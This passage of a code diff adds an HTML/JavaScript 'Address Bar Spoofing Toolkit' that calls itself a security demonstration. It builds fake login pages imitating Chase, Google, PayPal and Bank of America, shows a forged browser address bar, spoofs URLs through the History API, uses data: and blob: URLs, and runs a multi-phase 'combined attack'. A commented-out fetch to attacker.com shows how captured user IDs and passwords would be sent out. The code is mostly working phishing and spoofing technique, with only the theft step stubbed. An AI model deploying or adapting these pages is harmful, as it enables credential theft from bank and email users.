+                            background: #f8f9fa;
+                        }
+                        
+                        .input-group {
+                            margin-bottom: 20px;
+                            text-align: left;
+                        }
+                        
+                        label {
+                            display: block;
+                            margin-bottom: 8px;
+                            color: #3c4043;
+                            font-size: 14px;
+                        }
+                        
+                        input {
+                            width: 100%;
+                            padding: 14px;
+                            border: 1px solid #dadce0;
+                            border-radius: 4px;
+                            font-size: 16px;
+                        }
+                        
+                        .login-btn {
+                            width: 100%;
+                            padding: 14px;
+                            background: #117aca;
+                            color: white;
+                            border: none;
+                            border-radius: 4px;
+                            font-size: 16px;
+                            font-weight: 500;
+                            cursor: pointer;
+                        }
+                        
+                        .security-notice {
+                            margin-top: 20px;
+                            padding: 15px;
+                            background: #fff3cd;
+                            border: 1px solid #ffeaa7;
+                            border-radius: 4px;
+                            color: #856404;
+                            font-size: 14px;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="chrome-header">
+                        <div class="controls">
+                            <div class="control-btn" style="background: #ff5f57;"></div>
+                            <div class="control-btn" style="background: #ffbd2e;"></div>
+                            <div class="control-btn" style="background: #28ca42;"></div>
+                        </div>
+                        
+                        <div class="url-bar">
+                            <span class="secure-icon">🔒</span>
+                            <span class="url-text">https://secure.chase.com</span>
+                        </div>
+                        
+                        <div style="color: #5f6368; font-size: 12px;">
+                            Chrome | 100% | 4:20 PM
+                        </div>
+                    </div>
+                    
+                    <div class="banking-content">
+                        <div class="chase-logo">Chase</div>
+                        <h2>Online Banking</h2>
+                        <p>Sign in to your account</p>
+                        
+                        <div class="login-form">
+                            <div class="input-group">
+                                <label>User ID</label>
+                                <input type="text" placeholder="Enter User ID">
+                            </div>
+                            
+                            <div class="input-group">
+                                <label>Password</label>
+                                <input type="password" placeholder="Enter Password">
+                            </div>
+                            
+                            <button class="login-btn" onclick="handleLogin()">
+                                Sign In
+                            </button>
+                        </div>
+                        
+                        <div class="security-notice">
+                            <strong>⚠ SECURITY DEMONSTRATION</strong>
+                            <p>This is a fake banking page demonstrating address bar spoofing.</p>
+                            <p>Check the URL bar above - it's HTML/CSS, not the real browser address bar.</p>
+                        </div>
+                        
+                        <p style="margin-top: 30px; color: #666; font-size: 12px;">
+                            This iframe simulates: window.open() + sandbox bypass + UI spoofing
+                        </p>
+                    </div>
+                    
+                    <script>
+                        function handleLogin() {
+                            const userId = document.querySelector('input[type="text"]').value;
+                            const password = document.querySelector('input[type="password"]').value;
+                            
+                            alert('DEMO: Would steal:\\nUser ID: ' + userId + '\\nPassword: ' + password);
+                            
+                            // In real attack: exfiltrate data
+                            // fetch('https://attacker.com/log', {
+                            //     method: 'POST',
+                            //     body: JSON.stringify({userId, password}),
+                            //     mode: 'no-cors'
+                            // });
+                        }
+                        
+                        // Simulate security check
+                        setTimeout(() => {
+                            document.querySelector('.security-notice').innerHTML += 
+                                '<p style="margin-top: 10px; color: #155724; background: #d4edda; padding: 10px; border-radius: 4px;">' +
+                                '<strong>✓ Security Check:</strong> Connection is secure</p>';
+                        }, 3000);
+                    <\/script>
+                </body>
+                </html>
+            `;
+            
+            document.body.appendChild(iframe);
+            attackIframes.push(iframe);
+            
+            logResult('Advanced iframe spoof created with fake Chrome UI', 'success');
+        }
+        
+        function runWindowFeatureTest() {
+            logResult('Testing window feature manipulation...', 'info');
+            
+            const featuresList = [
+                {
+                    name: 'Normal Window',
+                    features: 'width=600,height=400,left=100,top=100,location=yes,toolbar=yes'
+                },
+                {
+                    name: 'No Address Bar',
+                    features: 'width=600,height=400,location=no,toolbar=no'
+                },
+                {
+                    name: 'Popup Style',
+                    features: 'width=400,height=300,location=1,status=0,resizable=0'
+                },
+                {
+                    name: 'Fullscreen-like',
+                    features: 'width=800,height=600,location=0,toolbar=0,menubar=0,scrollbars=1'
+                }
+            ];
+            
+            featuresList.forEach((featureSet, index) => {
+                setTimeout(() => {
+                    try {
+                        const win = window.open(
+                            'about:blank',
+                            `win_${index}`,
+                            featureSet.features
+                        );
+                        
+                        if (win) {
+                            attackWindows.push(win);
+                            win.document.write(`
+                                <!DOCTYPE html>
+                                <html>
+                                <head><title>${featureSet.name}</title></head>
+                                <body style="padding: 20px;">
+                                    <h1>${featureSet.name}</h1>
+                                    <p>Features: ${featureSet.features}</p>
+                                    <p>Check address bar visibility</p>
+                                    <p>Window URL: ${win.location.href}</p>
+                                </body>
+                                </html>
+                            `);
+                            win.document.close();
+                            
+                            logResult(`Opened: ${featureSet.name}`, 'success');
+                        } else {
+                            logResult(`Blocked: ${featureSet.name}`, 'warning');
+                        }
+                    } catch(e) {
+                        logResult(`Error: ${featureSet.name} - ${e.message}`, 'error');
+                    }
+                }, index * 2000);
+            });
+        }
+        
+        function runHistoryManipulation() {
+            logResult('Testing History API manipulation...', 'info');
+            
+            const win = window.open('about:blank', '_blank');
+            if (!win) {
+                logResult('Popup blocked', 'warning');
+                return;
+            }
+            
+            attackWindows.push(win);
+            
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Initial Page</title>
+                    <style>
+                        body { font-family: Arial; padding: 30px; }
+                        .fake-url { 
+                            background: #f0f0f0; 
+                            padding: 10px; 
+                            margin: 10px 0;
+                            font-family: monospace;
+                        }
+                    </style>
+                    <script>
+                        // Function to manipulate history
+                        function spoofURL() {
+                            try {
+                                // Save current state
+                                const currentState = history.state;
+                                
+                                // Push fake state
+                                history.pushState(
+                                    { spoofed: true, page: 'login' },
+                                    'Google Login',
+                                    'https://accounts.google.com/login?hl=en'
+                                );
+                                
+                                // Update page to match fake URL
+                                document.getElementById('content').innerHTML = \`
+                                    <h1>🔐 Google Sign In</h1>
+                                    <div class="fake-url">
+                                        Current URL (fake): \${location.href}
+                                    </div>
+                                    <p>This URL appears in the address bar but doesn't actually navigate</p>
+                                    <button onclick="alert('Would collect credentials')">
+                                        Sign In
+                                    </button>
+                                \`;
+                                
+                                return true;
+                            } catch(e) {
+                                return false;
+                            }
+                        }
+                        
+                        // Test on load
+                        setTimeout(() => {
+                            const success = spoofURL();
+                            if (success) {
+                                alert('History state spoofed! Check address bar.');
+                                console.log('Spoofed URL:', location.href);
+                            } else {
+                                alert('History manipulation blocked by browser');
+                            }
+                        }, 1000);
+                    <\/script>
+                </head>
+                <body>
+                    <div id="content">
+                        <h1>Loading Google...</h1>
+                        <p>Initial page - will be replaced</p>
+                    </div>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            
+            logResult('History manipulation test launched', 'success');
+        }
+        
+        function runDataURLSpoof() {
+            logResult('Testing Data URL spoofing techniques...', 'info');
+            
+            // Create various data URLs
+            const tests = [
+                {
+                    name: 'Basic Base64',
+                    url: 'data:text/html;base64,' + btoa(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title>PayPal Login</title>
+                            <style>
+                                body { font-family: Arial; padding: 40px; }
+                                .paypal { color: #003087; font-size: 32px; }
+                            </style>
+                        </head>
+                        <body>
+                            <div class="paypal">PayPal</div>
+                            <h2>Log in to your account</h2>
+                            <p>Data URL spoofing demonstration</p>
+                        </body>
+                        </html>
+                    `)
+                },
+                {
+                    name: 'URL Encoded',
+                    url: 'data:text/html;charset=utf-8,' + encodeURIComponent(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head><title>Bank of America</title></head>
+                        <body>
+                            <h1>Bank of America</h1>
+                            <p>Secure Online Banking</p>
+                            <p>Check the address bar - it's a data: URL</p>
+                        </body>
+                        </html>
+                    `)
+                },
+                {
+                    name: 'With Long Parameters',
+                    url: 'data:text/html;name=secure-site.html;type=application/xhtml+xml,' +
+                         encodeURIComponent('<h1>Secure Portal</h1><p>Looks legitimate</p>')
+                }
+            ];
+            
+            tests.forEach((test, index) => {
+                setTimeout(() => {
+                    try {
+                        const win = window.open(test.url, `data_${index}`);
+                        if (win) {
+                            attackWindows.push(win);
+                            logResult(`Data URL opened: ${test.name} (${test.url.length} chars)`, 'success');
+                        } else {
+                            logResult(`Blocked: ${test.name}`, 'warning');
+                        }
+                    } catch(e) {
+                        logResult(`Error: ${test.name} - ${e.message}`, 'error');
+                    }
+                }, index * 1500);
+            });
+        }
+        
+        function runCombinedAttack() {
+            logResult('Starting combined bypass attack...', 'warning');
+            
+            // Phase 1: Blob URL
+            const phase1HTML = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Security Check</title>
+                    <meta http-equiv="refresh" content="3">
+                    <style>
+                        body {
+                            font-family: system-ui;
+                            padding: 40px;
+                            text-align: center;
+                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                            color: white;
+                            height: 100vh;
+                            display: flex;
+                            flex-direction: column;
+                            justify-content: center;
+                            align-items: center;
+                        }
+                        .spinner {
+                            border: 4px solid rgba(255,255,255,0.3);
+                            border-radius: 50%;
+                            border-top: 4px solid white;
+                            width: 40px;
+                            height: 40px;
+                            animation: spin 1s linear infinite;
+                            margin: 20px;
+                        }
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>🔐 Security Verification</h1>
+                    <p>Checking browser security settings...</p>
+                    <div class="spinner"></div>
+                    <p style="font-size: 12px; opacity: 0.8;">
+                        Phase 1/3: Initialization
+                    </p>
+                </body>
+                </html>
+            `;
+            
+            const blob = new Blob([phase1HTML], { type: 'text/html' });
+            const win = window.open(URL.createObjectURL(blob), '_blank', 'width=400,height=300');
+            attackWindows.push(win);
+            
+            logResult('Phase 1: Blob URL launched', 'success');
+            
+            // Phase 2: iframe injection
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = `
+                    position: fixed;
+                    bottom: 20px;
+                    right: 20px;
+                    width: 300px;
+                    height: 200px;
+                    border: 2px solid #3b82f6;
+                    border-radius: 10px;
+                    z-index: 9999;
+                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                `;
+                iframe.srcdoc = `
+                    <h1 style="color: red;">⚠ Security Alert</h1>
+                    <p>Additional verification required</p>
+                    <button onclick="parent.postMessage('attack_phase2', '*')">
+                        Click to verify
+                    </button>
+                `;
+                
+                document.body.appendChild(iframe);
+                attackIframes.push(iframe);
+                
+                logResult('Phase 2: iframe injected', 'success');
+                
+                // Listen for iframe messages
+                window.addEventListener('message', (e) => {
+                    if (e.data === 'attack_phase2') {
+                        logResult('Phase 2: User interacted with iframe', 'warning');
+                    }
+                });
+                
+            }, 3000);
+            
+            // Phase 3: Final payload
+            setTimeout(() => {
+                const finalHTML = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Verification Complete</title>
+                        <style>
+                            body { 
+                                padding: 40px; 
+                                font-family: Arial; 
+                                text-align: center;
+                            }
+                            .success {
+                                color: #059669;
+                                font-size: 48px;
+                                margin: 20px;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="success">✓</div>
+                        <h1>Verification Complete</h1>
+                        <p>Your browser security has been checked</p>
+                        <p style="font-size: 12px; color: #666;">
+                            Combined attack demo completed
+                        </p>
+                    </body>
+                    </html>
+                `;
+                
+                const finalBlob = new Blob([finalHTML], { type: 'text/html' });
+                window.open(URL.createObjectURL(finalBlob), '_blank');
+                
+                logResult('Phase 3: Final payload delivered', 'success');
+                logResult('Combined attack sequence completed', 'success');
+                
+            }, 6000);
+        }
+        
+        function runCompatibilityTests() {
+            logResult('Running browser compatibility tests...', 'info');
+            
+            const browserInfo = document.getElementById('browserInfo');
+            const tests = [];
+            
+            // Test 1: Popup blocking
+            tests.push(() => {
+                const win = window.open('about:blank', '_test1');
+                const blocked = !win;
+                if (win) win.close();
+                return {
+                    name: 'Popup Blocking',
+                    result: blocked ? 'Strict' : 'Permissive',
+                    status: blocked ? 'success' : 'warning'
+                };
+            });
+            
+            // Test 2: Blob URL support
+            tests.push(() => {
+                try {
+                    const blob = new Blob(['test'], { type: 'text/plain' });
+                    const url = URL.createObjectURL(blob);
+                    URL.revokeObjectURL(url);
+                    return {
+                        name: 'Blob URLs',
+                        result: 'Supported',
+                        status: 'success'
+                    };
+                } catch(e) {
+                    return {
+                        name: 'Blob URLs',
+                        result: 'Not supported',
+                        status: 'error'
+                    };
+                }
+            });
+            
+            // Test 3: iframe sandbox
+            tests.push(() => {
+                const iframe = document.createElement('iframe');
+                const hasSandbox = 'sandbox' in iframe;
+                return {
+                    name: 'iframe Sandbox',
+                    result: hasSandbox ? 'Supported' : 'Not supported',
+                    status: hasSandbox ? 'success' : 'error'
+                };
+            });
+            
+            // Test 4: History API
+            tests.push(() => {
+                const hasHistory = 'pushState' in history;
+                return {
+                    name: 'History API',
+                    result: hasHistory ? 'Supported' : 'Not supported',
+                    status: hasHistory ? 'success' : 'error'
+                };
+            });
+            
+            // Run all tests
+            let resultsHTML = '<div style="font-family: monospace; font-size: 13px;">';
+            resultsHTML += '<strong>Browser Info:</strong><br>';
+            resultsHTML += `User Agent: ${navigator.userAgent}<br>`;
+            resultsHTML += `Platform: ${navigator.platform}<br><br>`;
+            resultsHTML += '<strong>Test Results:</strong><br>';
+            
+            tests.forEach((test, index) => {
+                setTimeout(() => {
+                    const result = test();
+                    const statusIcon = {
+                        success: '✅',
+                        error: '❌',
+                        warning: '⚠️'
+                    }[result.status];
+                    
+                    resultsHTML += `${statusIcon} ${result.name}: ${result.result}<br>`;
+                    browserInfo.innerHTML = resultsHTML;
+                    
+                    logResult(`Compatibility: ${result.name} - ${result.result}`, result.status);
+                }, index * 500);
+            });
+        }
+        
+        function detectProtections() {
+            logResult('Detecting browser security protections...', 'info');
+            
+            const protections = [];
+            
+            // Check for security headers via fetch
+            fetch(window.location.href)
+                .then(res => {
+                    const headers = res.headers;
+                    
+                    if (headers.get('content-security-policy')) {
+                        protections.push('Content Security Policy (CSP)');
+                    }
+                    
+                    if (headers.get('x-frame-options')) {
+                        protections.push('X-Frame-Options');
+                    }
+                    
+                    if (headers.get('strict-transport-security')) {
+                        protections.push('HTTP Strict Transport Security (HSTS)');
+                    }
+                    
+                    logResult(`Security headers detected: ${protections.join(', ') || 'None'}`, 
+                             protections.length ? 'success' : 'warning');
+                })
+                .catch(() => {
+                    logResult('Cannot check security headers (CORS)', 'warning');
+                });
+            
+            // Check for security-relevant APIs
+            if (window.trustedTypes) {
+                logResult('Trusted Types API enabled', 'success');
+            }
+            
+            if (window.crossOriginIsolated) {
+                logResult('Cross-Origin Isolation enabled', 'success');
+            }
+            
+            // Test CORS enforcement
+            fetch('https://httpbin.org/headers')
+                .then(() => logResult('CORS: Cross-origin fetch allowed', 'warning'))
+                .catch(() => logResult('CORS: Cross-origin fetch blocked', 'success'));
+        }
+        
+        function showDemo(type) {
+            const demoWindow = document.getElementById('demoWindow');
+            const demoUrlBar = document.getElementById('demoUrlBar');
+            const demoContent = document.getElementById('demoContent');
+            
+            switch(type) {
+                case 'blob':
+                    demoUrlBar.textContent = 'blob:https://attacker.com/550e8400-e29b-41d4-a716-446655440000';
+                    demoContent.innerHTML = `
+                        <h1>Blob URL Spoofing Demo</h1>
+                        <p>This window shows how blob: URLs can be used for spoofing.</p>
+                        <p>The address bar shows a blob: URL but content looks legitimate.</p>
+                        <div style="background: #f0f0f0; padding: 20px; margin: 20px 0; border-radius: 8px;">
+                            <h3>⚠ Security Alert</h3>
+                            <p>Your account requires immediate verification</p>
+                            <button style="padding: 10px 20px; background: #dc2626; color: white; border: none; border-radius: 4px;">
+                                Verify Now
+                            </button>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'about':
+                    demoUrlBar.textContent = 'about:blank';
+                    demoContent.innerHTML = `
+                        <h1>about:blank Spoofing Demo</h1>
+                        <p>about:blank pages can be manipulated to show fake content.</p>
+                        <p>Users see "about:blank" but the page can be anything.</p>
+                        <div style="display: flex; gap: 10px; margin-top: 20px;">
+                            <button onclick="demoTest('javascript:')" style="padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 4px;">
+                                Test javascript: URL
+                            </button>
+                            <button onclick="demoTest('data:')" style="padding: 10px; background: #10b981; color: white; border: none; border-radius: 4px;">
+                                Test data: URL
+                            </button>
+                        </div>
+                        <script>
+                            function demoTest(type) {
+                                alert('Would execute: ' + type + '...');
+                            }
+                        <\/script>
+                    `;
+                    break;
+            }
+            
+            demoWindow.style.display = 'block';
+            
+            // Auto-close after 10 seconds
+            clearTimeout(demoInterval);
+            demoInterval = setTimeout(closeDemo, 10000);
+        }
+        
+        function closeDemo() {
+            document.getElementById('demoWindow').style.display = 'none';
+        }
+        
+        function removeIframes() {
+            attackIframes.forEach(iframe => {
+                if (iframe && iframe.parentNode) {
+                    iframe.parentNode.removeChild(iframe);
+                }
+            });
+            attackIframes = [];
+            logResult('All iframes removed', 'success');
+        }
+        
+        function stopAllAttacks() {
+            // Close all windows
+            attackWindows.forEach(win => {
+                try {
+                    if (win && !win.closed) {
+                        win.close();
+                    }
+                } catch(e) {}
+            });
+            attackWindows = [];
+            
+            // Remove all iframes
+            removeIframes();
+            
+            // Stop any intervals
+            clearTimeout(demoInterval);
+            
+            logResult('All attacks stopped and windows closed', 'success');
+        }
+        
+        // Initialize
+        window.addEventListener('load', () => {
+            logResult('Address Bar Spoofing Toolkit loaded', 'success');
+            logResult(`Browser: ${navigator.userAgent}`, 'info');
+            
+            // Auto-run compatibility test
+            setTimeout(runCompatibilityTests, 1000);
+        });
+        
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', stopAllAttacks);
+    </script>
+</body>
+</html>
